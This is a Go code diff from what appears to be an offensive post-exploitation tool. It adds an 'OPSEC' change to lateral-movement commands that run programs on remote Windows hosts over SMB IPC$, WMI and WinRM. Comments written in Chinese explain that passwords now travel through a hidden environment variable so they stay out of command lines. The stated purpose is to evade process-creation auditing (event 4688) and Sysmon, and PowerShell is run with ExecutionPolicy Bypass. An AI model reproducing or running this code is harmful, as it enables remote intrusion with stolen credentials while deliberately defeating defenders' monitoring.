@@ -5,6 +5,7 @@ package commands
 import (
 	"context"
 	"fmt"
+	"os"
 	"os/exec"
 	"strings"
 	"time"
@@ -22,6 +23,30 @@ func execWithTimeoutLong(name string, args ...string) ([]byte, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
 	return exec.CommandContext(ctx, name, args...).CombinedOutput()
+}
+
+// lateralPassEnvName 横向移动凭据传递用的环境变量名。
+// 【OPSEC】密码绝不进命令行/脚本参数(原 'net use \\t\ipc$ 密码' 与 PowerShell
+// ConvertTo-SecureString '密码' 都会被 4688 进程创建审计/Sysmon WMI 事件捕获):
+// 凭据经 os/exec Env 传给子进程,PowerShell 侧从 $env: 读取,命令行全程无密码。
+// 子进程退出即随进程环境销毁。
+const lateralPassEnvName = "__TSHELL_LP"
+
+// execPSWithEnv 执行 PowerShell 脚本并注入额外环境变量(密码经此传递)
+func execPSWithEnv(script string, env map[string]string) ([]byte, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script)
+	cmd.Env = append(os.Environ(), envKV(env)...)
+	return cmd.CombinedOutput()
+}
+
+func envKV(env map[string]string) []string {
+	out := make([]string, 0, len(env))
+	for k, v := range env {
+		out = append(out, k+"="+v)
+	}
+	return out
 }
 
 // CmdPsexec 通过 SMB 服务方式在远程主机执行命令（wmi/winrm 前缀分流）。
@@ -51,9 +76,10 @@ func CmdPsexec(cmdBuf []byte) ([]byte, error) {
 	var logs []string
 
 	// 1. 建立 SMB IPC$ 连接（凭据可选；空凭据使用当前令牌上下文）
+	// 【OPSEC】密码经环境变量注入,由 PowerShell 侧建立 IPC$ 连接,命令行无密码
 	if user != "" {
-		cred := `net use ` + target + `\ipc$ ` + pass + ` /user:` + user + ` /y`
-		out, err := execWithTimeoutLong("cmd", "/c", cred)
+		psSMB := fmt.Sprintf(`net use %s\ipc$ $env:%s /user:%s /y`, target, lateralPassEnvName, user)
+		out, err := execPSWithEnv(psSMB, map[string]string{lateralPassEnvName: pass})
 		logs = append(logs, "[SMB] "+strings.TrimSpace(string(out)))
 		if err != nil {
 			logs = append(logs, fmt.Sprintf("[!] SMB 连接失败: %v", err))
@@ -96,19 +122,22 @@ func CmdWmiExec(cmdBuf []byte) ([]byte, error) {
 	command := strings.ReplaceAll(parts[3], "'", "''")
 
 	var ps string
+	env := map[string]string{}
 	if user != "" {
+		// 【OPSEC】密码经环境变量注入($env:),脚本/命令行均无明文
+		env[lateralPassEnvName] = pass
 		ps = fmt.Sprintf(`
-$sec = ConvertTo-SecureString '%s' -AsPlainText -Force
+$sec = ConvertTo-SecureString $env:%s -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('%s', $sec)
 Invoke-WmiMethod -ComputerName '%s' -Credential $cred -Class Win32_Process -Name Create -ArgumentList '%s' | Select-Object ProcessId, ReturnValue | Format-List
-`, pass, user, target, command)
+`, lateralPassEnvName, user, target, command)
 	} else {
 		ps = fmt.Sprintf(`
 Invoke-WmiMethod -ComputerName '%s' -Class Win32_Process -Name Create -ArgumentList '%s' | Select-Object ProcessId, ReturnValue | Format-List
 `, target, command)
 	}
 
-	out, err := execWithTimeoutLong("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
+	out, err := execPSWithEnv(ps, env)
 	if err != nil {
 		return nil, fmt.Errorf("WMI 执行失败: %v", err)
 	}
@@ -131,13 +160,16 @@ func CmdWinrmExec(cmdBuf []byte) ([]byte, error) {
 	command := strings.ReplaceAll(parts[3], "'", "''")
 
 	var ps string
+	env := map[string]string{}
 	if user != "" {
+		// 【OPSEC】密码经环境变量注入($env:),脚本/命令行均无明文
+		env[lateralPassEnvName] = pass
 		ps = fmt.Sprintf(`
-$sec = ConvertTo-SecureString '%s' -AsPlainText -Force
+$sec = ConvertTo-SecureString $env:%s -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('%s', $sec)
 $r = Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock { %s } -ErrorAction Stop
 $r | Out-String
-`, pass, user, target, command)
+`, lateralPassEnvName, user, target, command)
 	} else {
 		ps = fmt.Sprintf(`
 $r = Invoke-Command -ComputerName '%s' -ScriptBlock { %s } -ErrorAction Stop
@@ -145,7 +177,7 @@ $r | Out-String
 `, target, command)
 	}
 
-	out, err := execWithTimeoutLong("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
+	out, err := execPSWithEnv(ps, env)
 	if err != nil {
 		return nil, fmt.Errorf("WinRM 执行失败: %v（目标需启用 WinRM/PowerShell Remoting）", err)
 	}
